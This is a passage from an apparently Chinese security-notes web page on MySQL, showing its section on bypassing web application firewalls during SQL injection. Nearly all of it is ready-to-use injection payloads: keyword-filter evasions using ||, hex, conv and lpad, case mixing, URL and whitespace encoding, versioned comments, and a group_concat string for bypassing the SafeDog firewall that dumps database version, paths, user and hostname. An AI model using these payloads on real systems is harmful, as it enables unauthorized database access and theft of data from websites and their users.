bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;a&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>gruop_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> user_id <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号<span class="token punctuation">,</span> hex
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> unhex<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> lower<span class="token punctuation">(</span>conv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号<span class="token punctuation">,</span> hex<span class="token punctuation">,</span> substr
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> lower<span class="token punctuation">(</span>conv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> lpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span><span class="token punctuation">,</span> 单引号<span class="token punctuation">,</span> hex<span class="token punctuation">,</span> substr<span class="token punctuation">,</span> white space
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> lpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
bypass语句: <span class="token number">1</span><span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">||</span><span class="token operator">%</span><span class="token number">0</span>blpad<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>

大小写：
标准: <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> all_tables <span class="token keyword">WHERE</span> OWNER <span class="token operator">=</span> <span class="token string">&#39;DATABASE_NAME&#39;</span>
Bypassed: <span class="token keyword">sELecT</span> <span class="token operator">*</span> <span class="token keyword">FrOm</span> all_tables <span class="token keyword">whERe</span> OWNER <span class="token operator">=</span> <span class="token string">&#39;DATABASE_NAME&#39;</span>

URL编码：
被阻断语句: <span class="token keyword">uNIoN</span><span class="token punctuation">(</span><span class="token keyword">sEleCT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span>
Bypassed: <span class="token keyword">uNIoN</span><span class="token operator">%</span><span class="token number">28</span>sEleCT<span class="token operator">+</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">2</span>C2<span class="token operator">%</span><span class="token number">2</span>C3<span class="token operator">%</span><span class="token number">2</span>C4<span class="token operator">%</span><span class="token number">2</span>C5<span class="token operator">%</span><span class="token number">2</span>C6<span class="token operator">%</span><span class="token number">2</span>C7<span class="token operator">%</span><span class="token number">2</span>C8<span class="token operator">%</span><span class="token number">2</span>C9<span class="token operator">%</span><span class="token number">2</span>C10<span class="token operator">%</span><span class="token number">2</span>C11<span class="token operator">%</span><span class="token number">2</span>C12<span class="token operator">%</span><span class="token number">29</span>

一些绕过语句：
<span class="token number">0</span><span class="token operator">+</span><span class="token operator">div</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token keyword">union</span><span class="token operator">%</span><span class="token number">23</span>foo<span class="token operator">*</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span>bar<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aselect<span class="token operator">%</span><span class="token number">23</span>foo<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>A1<span class="token operator">%</span><span class="token number">2</span>C2<span class="token operator">%</span><span class="token number">2</span>Ccurrent_user
<span class="token number">1</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> DCount<span class="token punctuation">(</span><span class="token function">last</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token keyword">after</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token keyword">after</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">&#39;ad1min&#39;</span><span class="token punctuation">)</span>
<span class="token number">1</span>&#39;<span class="token keyword">UNION</span><span class="token comment">/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
amUserId=1 union select username,password,3,4 from users
%0Aselect%200x00,%200x41%20like/*!31337table_name*/</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">20</span>limit<span class="token operator">%</span><span class="token number">201</span>
<span class="token number">1</span><span class="token operator">%</span><span class="token number">0</span>bAND<span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token operator">%</span><span class="token number">0</span>b1<span class="token operator">%</span><span class="token number">20</span>FROM<span class="token operator">%</span><span class="token number">20</span>mysql<span class="token punctuation">.</span>x<span class="token punctuation">)</span>
<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">40</span>new<span class="token operator">%</span><span class="token number">20</span>union<span class="token operator">%</span><span class="token number">23</span>sqlmapsqlmap<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">0</span>Aselect<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token operator">%</span><span class="token number">23</span>sqlmap<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span>
<span class="token operator">%</span><span class="token number">0</span>Aselect<span class="token operator">%</span><span class="token number">200</span>x00<span class="token operator">%</span><span class="token number">2</span>C<span class="token operator">%</span><span class="token number">200</span>x41<span class="token operator">%</span><span class="token number">20</span><span class="token operator">not</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">like</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token operator">%</span><span class="token number">2100000</span>table_name<span class="token operator">*</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>C3<span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">20</span>limit<span class="token operator">%</span><span class="token number">201</span>
</code></pre></div><ul><li>绕过安全狗</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>group_concat<span class="token punctuation">(</span><span class="token number">0x3C68343E42797061737320736563757269747920646F672073716C5F696E6A6563743C68343E</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C20506F72743A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@port</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C2076657273696F6E3A</span><span class="token punctuation">,</span>@<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C5F696E7374616C6C5F706174683A2020</span><span class="token punctuation">,</span>@<span class="token variable">@basedir</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x4D7953514C5F64617461626173655F706174683A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@datadir</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x43757272656E7420646174616261736520757365723A20202020</span><span class="token punctuation">,</span><span class="token keyword">current_user</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x73797374656D2076657273696F6E3A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@version_compile_os</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x686F73746E616D653A20202020</span><span class="token punctuation">,</span>@<span class="token variable">@hostname</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x43757272656E742064617461626173653A20202020</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token comment">/*!()*/</span><span class="token punctuation">,</span><span class="token number">0x3C68723E</span><span class="token punctuation">,</span><span class="token number">0x5573657220496E666F3A20202020</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token comment">/*!()*/</span><span class="token punctuation">)</span>
</code></pre></div></div><hr><footer class="page-meta"><div class="meta-item edit-link"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M2 26h28v2H2z" fill="currentColor"></path><path d="M25.4 9c.8-.8.8-2 0-2.8l-3.6-3.6c-.8-.8-2-.8-2.8 0l-15 15V24h6.4l15-15zm-5-5L24 7.6l-3 3L17.4 7l3-3zM6 22v-3.6l10-10l3.6 3.6l-10 10H6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Edit this page<!--]--></span></span></div><div class="meta-item last-updated"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Last Updated 2023/6/14 18:04:28<!--]--></span></span></div></footer></div><!-- <PageNav /> --><div class="reco-valine-wrapper" style="display:none;"><div id="valine"></div></div></main><!--]--><div class="catalog"><div class="catalog-container"><h5 class="tip">此页内容 🖨️</h5><div class="page-catalog-container"><ul><!--[--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#下载" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="下载"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->下载<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#初始化" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="初始化"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->初始化<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#安装" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="安装"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->安装<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#启动" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="启动"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->启动<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#修改密码" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="修改密码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->修改密码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#基础" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="基础"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->基础<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#information-schema" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="information_schema"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->information_schema<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#常用函数" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="常用函数"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->常用函数<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#注入语句" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="注入语句"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->注入语句<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#万能密码" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="万能密码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->万能密码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#union注入" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="UNION注入"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->UNION注入<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#报错注入" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="报错注入"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->报错注入<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#写文件" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="写文件"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->写文件<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#读文件" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="读文件"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->读文件<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#写一句话木马" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="写一句话木马"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->写一句话木马<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#堆叠注入写木马" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="堆叠注入写木马"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->堆叠注入写木马<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#dnslog外带查询" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="DNSlog外带查询"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->DNSlog外带查询<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/DatabasesSecurity/MySQL.html#绕过语句" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="绕过语句"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->绕过语句<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--></ul></div></div></div></div></div></div><!----><!----><!--]--></div>
    <script type="module" src="/assets/app-98c41aab.js" defer></script>
  </body>
</html>
